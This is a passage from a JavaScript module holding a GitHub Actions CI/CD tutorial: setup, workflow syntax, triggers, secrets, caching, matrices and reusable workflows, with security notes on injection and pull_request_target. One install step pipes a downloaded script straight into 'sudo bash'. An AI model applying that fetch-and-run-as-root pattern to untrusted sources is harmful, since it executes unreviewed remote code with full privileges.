import { c, BT } from './shared/code.js'

const GH = '${{' // GitHub Actions / GitLab expression opener (avoids template interpolation)

export default {
  slug: 'cicd',
  title: 'CI/CD',
  tech: 'CI/CD',
  category: 'devops',
  minutes: 60,
  lang: 'yaml',
  description: 'Continuous integration and deployment with GitHub Actions (and GitLab CI): workflow syntax, triggers, secrets and environments, caching and matrix builds, ready CI pipelines for Laravel, Node, Python, React and Docker, deploying over SSH, Docker, AWS, GCP and static hosts, releases, security scanning and troubleshooting.',
  sections: [
    {
      id: 'setup-concepts',
      title: 'Concepts',
      group: 'Setup',
      items: [
        {
          title: 'CI vs continuous delivery vs continuous deployment',
          lang: 'text',
          code: c`
            Continuous integration (CI)
              every push / pull request → build + lint + test automatically
              goal: main is always in a working state

            Continuous delivery
              CI + every green build on main produces a release you COULD ship
              (image, bundle, package); a human clicks "deploy to production"

            Continuous deployment
              continuous delivery without the click: every green build on main
              goes to production automatically
            `,
          note: 'Most teams start with CI, then continuous delivery to a staging server, and only move to continuous deployment once tests and monitoring are trusted.',
        },
        {
          title: 'A typical pipeline',
          lang: 'text',
          code: c`
             push / PR
                │
                ▼
            ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────────┐
            │ checkout │──▶│ install  │──▶│ lint +   │──▶│  build   │──▶│ deploy       │
            │          │   │ (cached) │   │ test     │   │ artifact │   │ staging      │
            └──────────┘   └──────────┘   └──────────┘   └──────────┘   └──────┬───────┘
                                                                               │ approval
                                                                               ▼
                                                                        ┌──────────────┐
                                                                        │ deploy       │
                                                                        │ production   │
                                                                        └──────────────┘
            PRs stop after "build"; only main (or a tag) continues to deploy.
            `,
          note: 'The build artifact is made once and promoted from staging to production, so production runs exactly what was tested.',
        },
        {
          title: 'Vocabulary',
          lang: 'text',
          code: c`
            workflow   a YAML file in .github/workflows/ (a "pipeline")
            trigger    the event that starts it: push, pull_request, schedule, manual...
            job        a group of steps that runs on one machine; jobs run in parallel unless linked with needs
            step       one command (run:) or one reusable action (uses:)
            runner     the machine that executes a job (GitHub-hosted VM or your own server)
            action     a packaged step, e.g. actions/checkout@v4
            artifact   a file produced by a job and kept after it ends (build output, test report)
            secret     an encrypted value (token, key) injected at run time, masked in logs
            `,
        },
        {
          title: 'Where pipelines run',
          lang: 'text',
          code: c`
            GitHub Actions       .github/workflows/*.yml     hosted Linux / Windows / macOS runners
            GitLab CI/CD         .gitlab-ci.yml              hosted or self-managed runners
            Bitbucket Pipelines  bitbucket-pipelines.yml     hosted (Docker based)
            CircleCI             .circleci/config.yml        hosted or self-hosted
            Jenkins              Jenkinsfile                 your own server

            Hosted runner        fresh VM per job, nothing to maintain, billed by the minute on private repos
            Self-hosted runner   your machine/VM; needed for private networks, GPUs or special hardware
            `,
          note: 'The ideas on this sheet carry over to every platform; the examples use GitHub Actions because it is built into GitHub and free for public repositories. Never attach self-hosted runners to public repositories: anyone can open a pull request that runs code on them.',
        },
        {
          title: 'What to automate first',
          lang: 'text',
          code: c`
            1. Install dependencies from the lock file (npm ci / composer install / pip install -r)
            2. Lint and format check
            3. Unit tests
            4. Build (bundle, Docker image) to prove it still compiles
            5. Dependency and code scanning (Dependabot, CodeQL)
            6. Deploy to staging on every merge to main
            7. Deploy to production on a tag or with a manual approval
            `,
          note: 'Get steps 1-4 running on every pull request before anything else. A fast, reliable check on every PR gives more value than a complex deploy pipeline nobody trusts.',
        },
      ],
    },
    {
      id: 'setup-project',
      title: 'Project setup, step by step',
      group: 'Setup',
      items: [
        {
          title: '1. Install the GitHub CLI',
          lang: 'bash',
          code: c`
            # macOS
            brew install gh

            # Linux (Ubuntu / Debian)
            sudo mkdir -p -m 755 /etc/apt/keyrings
            wget -qO- https://cli.github.com/packages/githubcli-archive-keyring.gpg | sudo tee /etc/apt/keyrings/githubcli-archive-keyring.gpg > /dev/null
            sudo chmod go+r /etc/apt/keyrings/githubcli-archive-keyring.gpg
            echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/githubcli-archive-keyring.gpg] https://cli.github.com/packages stable main" | sudo tee /etc/apt/sources.list.d/github-cli.list > /dev/null
            sudo apt update && sudo apt install gh -y
            gh --version
            `,
          note: 'The gh command lets you set secrets, trigger workflows and follow runs from the terminal instead of the browser.',
          then: [
            {
              label: 'Windows (PowerShell)',
              lang: 'powershell',
              code: c`
              winget install --id GitHub.cli
              # open a new terminal so gh is on PATH
              gh --version
              `,
            },
          ],
        },
        {
          title: '2. Log in',
          lang: 'bash',
          code: c`
            # same on every OS
            gh auth login -s workflow      # GitHub.com → HTTPS → login with a web browser
            gh auth setup-git              # let git push with the gh token
            gh auth status                 # check the token scopes include workflow
            `,
          note: 'The workflow scope is required to push changes to files in .github/workflows over HTTPS; without it the push is rejected. gh normally requests it when you pick HTTPS, and the -s flag makes sure.',
        },
        {
          title: '3. Create the workflows folder',
          lang: 'bash',
          code: c`
            # macOS / Linux
            mkdir -p .github/workflows
            `,
          note: 'GitHub only picks up workflow files placed directly in .github/workflows at the repository root (not in subfolders), with a .yml or .yaml extension.',
          then: [
            {
              label: 'Windows (PowerShell)',
              lang: 'powershell',
              code: c`
              New-Item -ItemType Directory -Force -Path .github\workflows
              `,
            },
          ],
        },
        {
          title: '4. First workflow: .github/workflows/hello.yml',
          lang: 'yaml',
          code: c`
            name: Hello

            on:
              push:
              workflow_dispatch:      # adds a "Run workflow" button and allows gh workflow run

            permissions:
              contents: read          # the GITHUB_TOKEN can only read the repository

            jobs:
              hello:
                runs-on: ubuntu-latest
                timeout-minutes: 5
                steps:
                  - uses: actions/checkout@v4
                  - name: Say hello
                    run: |
                      echo "Hello from $GITHUB_REPOSITORY on $RUNNER_OS"
                      echo "Commit $GITHUB_SHA by $GITHUB_ACTOR"
                      ls -la
            `,
        },
        {
          title: '5. Push and watch the run',
          lang: 'bash',
          code: c`
            # same on every OS
            git add .github/workflows/hello.yml
            git commit -m "ci: add hello workflow"
            git push

            gh run list --limit 5              # recent runs and their status
            gh run watch                       # pick a run and follow it live
            gh run view --log-failed           # pick a run, show only the logs of failed steps
            gh run rerun --failed              # pick a run, rerun only its failed jobs
            gh workflow run hello.yml          # start it manually (needs workflow_dispatch)
            `,
          note: 'Without a run id these commands ask you to pick a run interactively. Pass the id from gh run list to use them in scripts.',
        },
        {
          title: '6. Add a status badge to README.md',
          lang: 'text',
          code: c`
            ![CI](https://github.com/your-org/your-app/actions/workflows/ci.yml/badge.svg)

            <!-- clickable, and pinned to one branch -->
            [![CI](https://github.com/your-org/your-app/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/your-org/your-app/actions/workflows/ci.yml)
            `,
          note: 'Replace ci.yml with the workflow file name. Without the branch parameter the badge shows the status of the default branch.',
        },
      ],
    },
    {
      id: 'setup-act',
      title: 'Run workflows locally with act',
      group: 'Setup',
      items: [
        {
          title: 'Install act',
          lang: 'bash',
          code: c`
            # macOS
            brew install act

            # Linux (Ubuntu / Debian)
            curl --proto '=https' --tlsv1.2 -sSf https://raw.githubusercontent.com/nektos/act/master/install.sh | sudo bash -s -- -b /usr/local/bin
            act --version
            `,
          note: 'act runs each job inside a Docker container, so Docker Desktop (or Docker Engine on Linux) must be installed and running. On first run it asks which runner image size to use; Medium is a good default.',
          then: [
            {
              label: 'Windows (PowerShell)',
              lang: 'powershell',
              code: c`
              winget install nektos.act
              # open a new terminal so act is on PATH
              act --version
              `,
            },
            {
              label: 'As a gh extension (same on every OS)',
              lang: 'bash',
              code: c`
              gh extension install nektos/gh-act
              gh act --version
              `,
            },
          ],
        },
        {
          title: 'Run workflows',
          lang: 'bash',
          code: c`
            # same on every OS
            act -l                               # list jobs and the events that trigger them
            act                                  # simulate a push event
            act pull_request                     # simulate a pull request
            act -j test                          # run only the job with id "test"
            act -W .github/workflows/ci.yml      # run only this workflow file
            act workflow_dispatch --input environment=staging
            act -n                               # dry run: show what would run
            `,
        },
        {
          title: 'Pass secrets and variables',
          lang: 'bash',
          code: c`
            # same on every OS
            act --secret-file .secrets --var-file .vars
            act -s DEPLOY_KEY=abc123 --var API_URL=https://staging.example.com
            `,
          note: 'Both files use KEY=value lines like a .env file, and act reads .secrets and .vars from the current folder automatically if they exist. Add them to .gitignore so they are never committed.',
          then: [
            {
              label: '.secrets',
              lang: 'env',
              code: c`
              GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxx
              DEPLOY_KEY=abc123
              `,
            },
            {
              label: '.gitignore',
              lang: 'text',
              code: c`
              .secrets
              .vars
              `,
            },
            {
              label: 'Reuse your gh token (macOS / Linux)',
              lang: 'bash',
              code: c`
              act -s GITHUB_TOKEN="$(gh auth token)"
              `,
            },
            {
              label: 'Reuse your gh token (Windows PowerShell)',
              lang: 'powershell',
              code: c`
              act -s "GITHUB_TOKEN=$(gh auth token)"
              `,
            },
          ],
        },
        {
          title: 'Defaults in .actrc',
          lang: 'text',
          code: c`
            -P ubuntu-latest=catthehacker/ubuntu:act-latest
            --container-architecture linux/amd64
            --secret-file .secrets
            --artifact-server-path /tmp/act-artifacts
            `,
          note: 'Put this file in the project root (or your home folder) to avoid repeating flags. The container architecture line is needed on Apple Silicon Macs; the artifact server path lets upload-artifact and download-artifact work locally (on Windows use a Windows path for it).',
        },
        {
          title: 'Limitations',
          note: 'act is a fast feedback loop, not an exact copy of GitHub. Only Linux jobs run, so macos-latest and windows-latest jobs are skipped. OIDC tokens, environment protection rules and required reviewers do not exist locally. The default images contain fewer tools than GitHub\'s hosted runners, so a step can fail locally and pass on GitHub. Always confirm with a real run before relying on a change.',
        },
      ],
    },
    {
      id: 'gha-syntax',
      title: 'Workflow syntax',
      group: 'GitHub Actions',
      items: [
        {
          title: 'Anatomy of a workflow',
          lang: 'yaml',
          code: c`
            name: CI                          # shown in the Actions tab

            on:
              push:
                branches: [main]
              pull_request:

            permissions:
              contents: read                  # least privilege for the GITHUB_TOKEN

            jobs:
              test:                           # job id (used by needs, outputs, act -j)
                name: Lint and test
                runs-on: ubuntu-latest        # or windows-latest, macos-latest, self-hosted
                timeout-minutes: 15           # default is 360
                defaults:
                  run:
                    working-directory: ./app  # every run: step starts here (not uses: steps)
                steps:
                  - uses: actions/checkout@v4 # an action
                  - uses: actions/setup-node@v4
                    with:                     # action inputs
                      node-version: 24
                      cache: npm
                      cache-dependency-path: app/package-lock.json
                  - run: npm ci               # a shell command
                  - name: Lint and test       # multi-line command
                    run: |
                      npm run lint
                      npm test
            `,
          note: 'Each job gets a fresh machine, so files from one job are not visible in another unless you pass them as artifacts. Steps inside a job share the same file system. working-directory only applies to run steps, so actions that look for files need their own path.',
        },
        {
          title: 'Job order with needs',
          lang: 'yaml',
          code: c`
            jobs:
              lint:
                runs-on: ubuntu-latest
                steps: [{ run: echo lint }]
              test:
                runs-on: ubuntu-latest
                steps: [{ run: echo test }]
              build:
                needs: [lint, test]           # waits for both; skipped if either fails
                runs-on: ubuntu-latest
                steps: [{ run: echo build }]
              notify:
                needs: build
                if: always()                  # runs even when build failed or was skipped
                runs-on: ubuntu-latest
                steps:
                  - run: echo "build result was $RESULT"
                    env:
                      RESULT: ${GH} needs.build.result }}
            `,
          note: 'Jobs without needs start in parallel. The result of a needed job is success, failure, cancelled or skipped.',
        },
        {
          title: 'if conditions',
          lang: 'yaml',
          code: c`
            jobs:
              deploy:
                # job level: only pushes to main
                if: github.event_name == 'push' && github.ref == 'refs/heads/main'
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
                  - run: ./deploy.sh
                  - if: failure()                       # only when an earlier step failed
                    run: echo "Deploy failed"
                  - if: ${GH} !cancelled() }}            # a leading ! must be wrapped in the expression syntax
                    run: echo "Runs unless the run was cancelled"

              checks:
                runs-on: ubuntu-latest
                steps:
                  - if: startsWith(github.ref, 'refs/tags/v')
                    run: echo "Tag build"
                  - if: github.event_name == 'pull_request' && contains(github.event.pull_request.labels.*.name, 'deploy-preview')
                    run: echo "PR has the deploy-preview label"
            `,
          note: 'In if you can omit the expression wrapper, except when the condition starts with ! (YAML would read it as a tag). Status functions: success() is the default, failure(), always(), cancelled().',
        },
        {
          title: 'env at workflow, job and step level',
          lang: 'yaml',
          code: c`
            env:                              # whole workflow
              NODE_ENV: test
              REGISTRY: ghcr.io

            jobs:
              build:
                runs-on: ubuntu-latest
                env:                          # this job only
                  IMAGE: ghcr.io/your-org/your-app
                steps:
                  - run: echo "$REGISTRY $IMAGE $NODE_ENV"
                  - run: echo "$API_URL $NODE_ENV"
                    env:                      # this step only; the innermost level wins
                      API_URL: ${GH} vars.API_URL }}
                      NODE_ENV: production
                  - run: echo "BUILD_DATE=$(date -u +%F)" >> "$GITHUB_ENV"   # set for later steps
                  - run: echo "$BUILD_DATE"
            `,
          note: 'Use $NAME inside run scripts (the shell expands it) and the env context only in places the shell never sees, such as with or if.',
        },
        {
          title: 'Step outputs and job outputs',
          lang: 'yaml',
          code: c`
            jobs:
              build:
                runs-on: ubuntu-latest
                outputs:                                       # expose to other jobs
                  version: ${GH} steps.ver.outputs.version }}
                steps:
                  - uses: actions/checkout@v4
                    with:
                      fetch-depth: 5                           # enough history for git log below
                  - id: ver
                    run: echo "version=1.4.$GITHUB_RUN_NUMBER" >> "$GITHUB_OUTPUT"
                  - run: echo "Building ${GH} steps.ver.outputs.version }}"
                  - name: Multi-line output
                    id: notes
                    run: |
                      {
                        echo "text<<EOF"
                        git log -5 --oneline
                        echo "EOF"
                      } >> "$GITHUB_OUTPUT"
                  - run: echo "$NOTES"
                    env:
                      NOTES: ${GH} steps.notes.outputs.text }}

              deploy:
                needs: build
                runs-on: ubuntu-latest
                steps:
                  - run: echo "Deploying ${GH} needs.build.outputs.version }}"
            `,
          note: 'A step needs an id for its outputs to be readable. Job outputs must be declared under outputs and are read through needs in a downstream job. Text you do not control, such as commit messages, should reach the shell through env.',
        },
        {
          title: 'Contexts and expressions',
          lang: 'yaml',
          code: c`
            # common contexts
            #   github.sha  github.ref  github.ref_name  github.event_name  github.actor
            #   github.event.pull_request.number  github.run_id  github.repository
            #   runner.os  runner.temp   env.X  vars.X  secrets.X  inputs.X
            #   matrix.X  steps.<id>.outputs.X  needs.<job>.outputs.X  job.status
            # functions
            #   contains()  startsWith()  endsWith()  format()  join()
            #   toJSON()  fromJSON()  hashFiles()

            steps:
              - run: echo "Image tag is $TAG"
                env:
                  TAG: ${GH} format('{0}-{1}', github.ref_name, github.run_number) }}
              - run: echo "Short SHA is $(echo "$GITHUB_SHA" | cut -c1-7)"
              - name: Untrusted input goes through env, never straight into run
                env:
                  PR_TITLE: ${GH} github.event.pull_request.title }}
                run: echo "$PR_TITLE"
              - name: Dump the whole github context (debugging)
                env:
                  CTX: ${GH} toJSON(github) }}
                run: echo "$CTX"
              - run: echo "Ref is $GITHUB_REF_NAME"   # default env vars mirror most github.* values
            `,
          note: 'Expressions are substituted before the shell runs, so a PR title or branch name containing shell syntax could execute as code if placed directly in run. Passing it through env makes it plain data.',
        },
      ],
    },
    {
      id: 'gha-triggers',
      title: 'Triggers',
      group: 'GitHub Actions',
      items: [
        {
          title: 'push and pull_request with branch and path filters',
          lang: 'yaml',
          code: c`
            on:
              push:
                branches: [main, 'release/**']
                paths:
                  - 'src/**'
                  - 'package.json'
                  - 'package-lock.json'
                  - '.github/workflows/ci.yml'
              pull_request:
                branches: [main]              # PRs that target main
                types: [opened, synchronize, reopened, ready_for_review]
                paths-ignore:
                  - '**.md'
                  - 'docs/**'
            `,
          note: 'A run starts only if at least one changed file matches paths (or not every file matches paths-ignore). You cannot use paths and paths-ignore, or branches and branches-ignore, for the same event. Branch filters on pull_request match the target branch, not the PR branch. A workflow skipped by a path filter never reports a status, so a required check that depends on it stays pending.',
        },
        {
          title: 'Release on version tags',
          lang: 'yaml',
          code: c`
            on:
              push:
                tags: ['v*.*.*']

            permissions:
              contents: write                 # needed to create the release

            jobs:
              release:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
                  - uses: actions/setup-node@v4
                    with:
                      node-version: 24
                      cache: npm
                  - run: npm ci && npm run build && tar -czf app.tar.gz dist
                  - uses: softprops/action-gh-release@v2
                    with:
                      name: ${GH} github.ref_name }}
                      generate_release_notes: true
                      files: app.tar.gz
            `,
          note: 'Path filters are ignored for tag pushes. A release created with the built-in GITHUB_TOKEN does not trigger other workflows, so do any follow-up publishing in this same workflow.',
          then: [
            {
              label: 'Create and push the tag (same on every OS)',
              lang: 'bash',
              code: c`
              git tag -a v1.4.0 -m "v1.4.0"
              git push origin v1.4.0
              `,
            },
          ],
        },
        {
          title: 'Schedule (cron)',
          lang: 'yaml',
          code: c`
            on:
              schedule:
                - cron: '0 3 * * 1-5'         # 03:00 UTC, Monday to Friday
                - cron: '*/30 * * * *'        # every 30 minutes (the shortest allowed is 5)
              workflow_dispatch:              # also allow a manual run
            `,
          note: 'Times are UTC and runs only on the default branch. Scheduled runs can start several minutes late at busy times, and GitHub disables them in public repositories after 60 days without activity.',
        },
        {
          title: 'Manual run with inputs (workflow_dispatch)',
          lang: 'yaml',
          code: c`
            on:
              workflow_dispatch:
                inputs:
                  environment:
                    description: Target environment
                    type: choice
                    options: [staging, production]
                    default: staging
                  dry_run:
                    description: Only print what would happen
                    type: boolean
                    default: false
                  version:
                    description: Version to deploy (empty = latest)
                    type: string
                    required: false

            permissions:
              contents: read

            jobs:
              deploy:
                runs-on: ubuntu-latest
                environment: ${GH} inputs.environment }}
                steps:
                  - run: echo "Deploying $VERSION to $TARGET (dry run $DRY)"
                    env:
                      TARGET: ${GH} inputs.environment }}
                      DRY: ${GH} inputs.dry_run }}
                      VERSION: ${GH} inputs.version }}
            `,
          note: 'The file must exist on the default branch before the Run workflow button or gh workflow run can find it.',
          then: [
            {
              label: 'Start it from the terminal (same on every OS)',
              lang: 'bash',
              code: c`
              gh workflow run deploy.yml --ref main -f environment=production -f dry_run=true
              gh run watch
              `,
            },
          ],
        },
        {
          title: 'When a GitHub release is published',
          lang: 'yaml',
          code: c`
            on:
              release:
                types: [published]

            jobs:
              publish:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
                  - run: echo "Publishing $TAG"
                    env:
                      TAG: ${GH} github.event.release.tag_name }}
            `,
          note: 'Use this when releases are created by hand in the GitHub UI or with gh release create; use a tag push when the pipeline creates the release itself. Releases created by another workflow with GITHUB_TOKEN do not fire this event.',
        },
        {
          title: 'Called by another workflow (workflow_call)',
          lang: 'yaml',
          code: c`
            on:
              workflow_call:
                inputs:
                  environment:
                    type: string
                    required: true
                secrets:
                  DEPLOY_KEY:
                    required: true
              workflow_dispatch:              # can be combined with other triggers
            `,
          note: 'This turns the file into a reusable workflow. The Reuse section below shows how to call it.',
        },
        {
          title: 'pull_request_target: handle with care',
          lang: 'yaml',
          code: c`
            on:
              pull_request_target:
                types: [opened]

            permissions:
              pull-requests: write            # nothing else

            jobs:
              welcome:
                runs-on: ubuntu-latest
                steps:
                  # no checkout of the PR code: this job has secrets and a write token
                  - run: gh pr comment "$PR" --repo "$GITHUB_REPOSITORY" --body "Thanks! CI will run shortly."
                    env:
                      GH_TOKEN: ${GH} github.token }}
                      PR: ${GH} github.event.pull_request.number }}
            `,
          note: 'pull_request_target runs the base branch\'s workflow with secrets and a write token, even for pull requests from forks. Never check out, build or run the PR\'s code in it; use plain pull_request for testing contributions and keep pull_request_target for labelling or commenting.',
        },
      ],
    },
    {
      id: 'gha-secrets',
      title: 'Secrets, variables & environments',
      group: 'GitHub Actions',
      items: [
        {
          title: 'Set repository secrets with gh',
          lang: 'bash',
          code: c`
            # same on every OS
            gh secret set DEPLOY_KEY                    # prompts for the value (hidden)
            gh secret set API_TOKEN --body "abc123"     # quick, but the value lands in shell history
            gh secret set -f .env.ci                    # every KEY=value line in the file
            gh secret list
            gh secret delete OLD_TOKEN
            `,
          note: 'Secrets are write-only: nobody can read them back, and the runner masks their values in logs. They are not passed to workflows triggered by pull requests from forks.',
        },
        {
          title: 'Secret from a file (bash vs PowerShell)',
          lang: 'bash',
          code: c`
            # macOS / Linux
            gh secret set DEPLOY_SSH_KEY < ~/.ssh/id_ed25519

            # binary file → base64 first
            base64 -i keystore.jks | gh secret set KEYSTORE_B64      # macOS
            base64 -w0 keystore.jks | gh secret set KEYSTORE_B64     # Linux
            `,
          note: 'PowerShell has no < input redirection, so pipe the file content into gh instead.',
          then: [
            {
              label: 'Windows (PowerShell)',
              lang: 'powershell',
              code: c`
              Get-Content -Raw $HOME\.ssh\id_ed25519 | gh secret set DEPLOY_SSH_KEY

              # binary file → base64 first
              [Convert]::ToBase64String([IO.File]::ReadAllBytes("$PWD\keystore.jks")) | gh secret set KEYSTORE_B64
              `,
            },
            {
              label: 'Decode it in the workflow',
              lang: 'yaml',
              code: c`
              - run: echo "$KEYSTORE_B64" | base64 -d > keystore.jks
                env:
                  KEYSTORE_B64: ${GH} secrets.KEYSTORE_B64 }}
              `,
            },
          ],
        },
        {
          title: 'Variables (non-secret config)',
          lang: 'bash',
          code: c`
            # same on every OS
            gh variable set API_URL --body "https://api.example.com"
            gh variable set NODE_VERSION --body "24"
            gh variable set -f .vars.ci
            gh variable list
            `,
          note: 'Variables are readable in logs and through the API. Use them for URLs, region names and feature flags; use secrets for anything sensitive.',
          then: [
            {
              label: 'Use secrets and variables in a workflow',
              lang: 'yaml',
              code: c`
              steps:
                - run: ./scripts/deploy.sh
                  env:
                    API_URL: ${GH} vars.API_URL }}
                    DEPLOY_KEY: ${GH} secrets.DEPLOY_KEY }}
                - name: Write the SSH key to disk
                  run: |
                    mkdir -p ~/.ssh
                    echo "$SSH_KEY" > ~/.ssh/id_ed25519
                    chmod 600 ~/.ssh/id_ed25519
                  env:
                    SSH_KEY: ${GH} secrets.DEPLOY_SSH_KEY }}
              `,
            },
          ],
        },
        {
          title: 'Environments and environment secrets',
          lang: 'bash',
          code: c`
            # same on every OS
            gh api -X PUT repos/your-org/your-app/environments/staging       # create
            gh api -X PUT repos/your-org/your-app/environments/production
            gh secret set DEPLOY_KEY --env production
            gh variable set API_URL --env production --body "https://example.com"
            `,
          note: 'A job that declares an environment gets that environment\'s secrets and variables, which override repository-level ones with the same name.',
          then: [
            {
              label: 'Use the environment in a job',
              lang: 'yaml',
              code: c`
              jobs:
                deploy:
                  runs-on: ubuntu-latest
                  environment:
                    name: production
                    url: https://example.com      # shown as a link on the run page
                  steps:
                    - uses: actions/checkout@v4
                    - run: ./scripts/deploy.sh
                      env:
                        DEPLOY_KEY: ${GH} secrets.DEPLOY_KEY }}
                        API_URL: ${GH} vars.API_URL }}
              `,
            },
          ],
        },
        {
          title: 'Required reviewers and branch restrictions',
          lang: 'bash',
          code: c`
            # same on every OS
            gh api users/your-username --jq .id                 # numeric user id for the JSON below
            gh api -X PUT repos/your-org/your-app/environments/production --input production-env.json
            `,
          note: 'Jobs targeting the environment pause until a listed reviewer approves, and only protected branches can deploy. Also available under Settings, Environments. Required reviewers and wait timers work on public repositories on every plan; private repositories need GitHub Enterprise for them.',
          then: [
            {
              label: 'production-env.json',
              lang: 'json',
              code: c`
              {
                "wait_timer": 0,
                "prevent_self_review": true,
                "reviewers": [{ "type": "User", "id": 1234567 }],
                "deployment_branch_policy": {
                  "protected_branches": true,
                  "custom_branch_policies": false
                }
              }
              `,
            },
          ],
        },
        {
          title: 'permissions: least privilege and OIDC',
          lang: 'yaml',
          code: c`
            permissions:
              contents: read                  # default for every job in this file

            jobs:
              deploy:
                runs-on: ubuntu-latest
                permissions:                  # replaces the workflow-level block for this job
                  contents: read
                  id-token: write             # lets the job request an OIDC token
                steps:
                  - uses: actions/checkout@v4
                  - uses: aws-actions/configure-aws-credentials@v4
                    with:
                      role-to-assume: arn:aws:iam::123456789012:role/github-deploy
                      aws-region: eu-west-1
                  - run: aws s3 sync dist/ s3://your-app-bucket --delete
            `,
          note: 'The permissions block limits what the built-in GITHUB_TOKEN can do; any scope you do not list becomes none. With OIDC the cloud provider trusts GitHub directly, so no long-lived cloud keys are stored as secrets. Other common scopes: packages write for ghcr.io, pull-requests write for PR comments.',
          then: [
            {
              label: 'Start from no permissions at all',
              lang: 'yaml',
              code: c`
              permissions: {}
              `,
            },
          ],
        },
      ],
    },
    {
      id: 'gha-speed',
      title: 'Speed: cache, matrix, artifacts, concurrency',
      group: 'GitHub Actions',
      items: [
        {
          title: 'Built-in dependency cache in setup actions',
          lang: 'yaml',
          code: c`
            - uses: actions/setup-node@v4
              with:
                node-version: 24
                cache: npm                    # or yarn, pnpm; keyed on the lock file
            - run: npm ci

            - uses: actions/setup-python@v5
              with:
                python-version: '3.12'
                cache: pip                    # keyed on requirements.txt
                cache-dependency-path: requirements*.txt
            - run: pip install -r requirements.txt
            `,
          note: 'This caches the package manager\'s download folder, not node_modules, which keeps installs correct while skipping most downloads. cache-dependency-path points the key at lock files outside the default location.',
        },
        {
          title: 'actions/cache with a hashFiles key',
          lang: 'yaml',
          code: c`
            - uses: shivammathur/setup-php@v2
              with:
                php-version: '8.3'
                tools: composer:v2
            - id: composer-cache
              run: echo "dir=$(composer config cache-files-dir)" >> "$GITHUB_OUTPUT"
            - uses: actions/cache@v4
              with:
                path: ${GH} steps.composer-cache.outputs.dir }}
                key: ${GH} runner.os }}-composer-${GH} hashFiles('**/composer.lock') }}
                restore-keys: |
                  ${GH} runner.os }}-composer-
            - run: composer install --no-interaction --prefer-dist
            `,
          note: 'The key changes whenever the lock file changes. restore-keys falls back to the newest cache with a matching prefix, so a partial cache is still used.',
        },
        {
          title: 'Matrix with include, exclude and fail-fast',
          lang: 'yaml',
          code: c`
            jobs:
              test:
                runs-on: ${GH} matrix.os }}
                strategy:
                  fail-fast: false            # let other combinations finish when one fails
                  max-parallel: 4             # at most 4 jobs at the same time
                  matrix:
                    os: [ubuntu-latest, windows-latest, macos-latest]
                    node: [22, 24]
                    exclude:
                      - os: macos-latest
                        node: 22
                    include:
                      - os: ubuntu-latest     # adds a field to an existing combination
                        node: 24
                        coverage: true
                steps:
                  - uses: actions/checkout@v4
                  - uses: actions/setup-node@v4
                    with:
                      node-version: ${GH} matrix.node }}
                      cache: npm
                  - run: npm ci
                  - run: npm test
                  - if: matrix.coverage
                    run: npm run test:coverage
            `,
          note: 'This creates 5 jobs (3 OS x 2 versions, minus one excluded), with max-parallel capping how many run at once. An include entry that matches no existing combination adds a new job. fail-fast defaults to true, which cancels the rest as soon as one job fails.',
        },
        {
          title: 'Pass files between jobs with artifacts',
          lang: 'yaml',
          code: c`
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
                  - uses: actions/setup-node@v4
                    with: { node-version: 24, cache: npm }
                  - run: npm ci && npm run build
                  - uses: actions/upload-artifact@v4
                    with:
                      name: dist
                      path: dist/
                      retention-days: 7
                      if-no-files-found: error

              deploy:
                needs: build
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/download-artifact@v4
                    with:
                      name: dist
                      path: dist
                  - run: ls -R dist
            `,
          note: 'An artifact name can be uploaded only once per run, so matrix jobs need unique names, for example by adding the matrix values to the name.',
          then: [
            {
              label: 'Download an artifact locally (same on every OS)',
              lang: 'bash',
              code: c`
              gh run list --limit 5
              gh run download 1234567890 -n dist -D ./dist
              `,
            },
          ],
        },
        {
          title: 'Cancel outdated runs with concurrency',
          lang: 'yaml',
          code: c`
            # CI: a new push to the same PR cancels the previous run
            concurrency:
              group: ${GH} github.workflow }}-${GH} github.event.pull_request.number || github.ref }}
              cancel-in-progress: ${GH} github.event_name == 'pull_request' }}
            `,
          note: 'Runs on main are not cancelled midway; they wait for the running one to finish. Only one run can wait per group, so a newer waiting run replaces an older waiting one.',
          then: [
            {
              label: 'Deploys: one at a time, never cancelled midway',
              lang: 'yaml',
              code: c`
              jobs:
                deploy:
                  runs-on: ubuntu-latest
                  concurrency:
                    group: deploy-production
                    cancel-in-progress: false
                  steps:
                    - uses: actions/checkout@v4
                    - run: ./scripts/deploy.sh
              `,
            },
          ],
        },
        {
          title: 'Other quick wins',
          note: 'Set timeout-minutes on every job so a hung test does not burn hours. Use path filters so documentation changes skip the test suite. Split slow suites across matrix jobs. Build Docker images with the Buildx GitHub Actions cache instead of rebuilding every layer.',
        },
      ],
    },
    {
      id: 'gha-reuse',
      title: 'Reuse: reusable workflows & composite actions',
      group: 'GitHub Actions',
      items: [
        {
          title: 'Reusable workflow: .github/workflows/deploy.yml',
          lang: 'yaml',
          code: c`
            name: Deploy

            on:
              workflow_call:
                inputs:
                  environment:
                    type: string
                    required: true
                  node-version:
                    type: string
                    default: '24'
                secrets:
                  DEPLOY_KEY:
                    required: true
                outputs:
                  url:
                    description: Deployed URL
                    value: ${GH} jobs.deploy.outputs.url }}

            jobs:
              deploy:
                runs-on: ubuntu-latest
                environment: ${GH} inputs.environment }}
                outputs:
                  url: ${GH} steps.out.outputs.url }}
                steps:
                  - uses: actions/checkout@v4
                  - uses: actions/setup-node@v4
                    with:
                      node-version: ${GH} inputs.node-version }}
                      cache: npm
                  - run: npm ci && npm run build
                  - run: ./scripts/deploy.sh "$TARGET"
                    env:
                      TARGET: ${GH} inputs.environment }}
                      DEPLOY_KEY: ${GH} secrets.DEPLOY_KEY }}
                  - id: out
                    run: echo "url=https://$TARGET.example.com" >> "$GITHUB_OUTPUT"
                    env:
                      TARGET: ${GH} inputs.environment }}
            `,
          note: 'A reusable workflow is a whole pipeline with its own jobs and runners. Callers pass inputs and secrets, and can read its outputs. Its GITHUB_TOKEN can never have more permissions than the calling job.',
        },
        {
          title: 'Call it from another workflow',
          lang: 'yaml',
          code: c`
            permissions:
              contents: read

            jobs:
              test:
                uses: ./.github/workflows/test.yml          # same repository

              deploy-staging:
                needs: test
                uses: ./.github/workflows/deploy.yml
                with:
                  environment: staging
